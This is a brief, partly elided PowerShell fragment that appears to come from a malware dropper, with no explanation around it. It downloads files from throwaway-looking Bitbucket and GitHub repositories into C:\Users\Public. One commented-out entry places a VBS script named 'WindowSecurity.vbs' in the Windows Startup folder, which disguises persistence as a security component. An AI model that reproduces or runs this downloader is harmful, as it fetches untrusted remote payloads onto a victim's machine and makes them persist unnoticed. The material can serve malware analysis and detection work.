...
$downloads = @(
    #@{ Url = "https://bitbucket.org/testdropp/test/downloads/startup.vbs"; Output = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowSecurity.vbs" },
    ...
    @{ Url = "https://bitbucket.org/bich89hell/new/downloads/document4.zip"; Output = "C:\Users\Public\document8.zip" }
)
...
Invoke-WebRequest https://github.com/VXB189/test123123/blob/main/update.py -OutFile C:\Users\Public\update.py
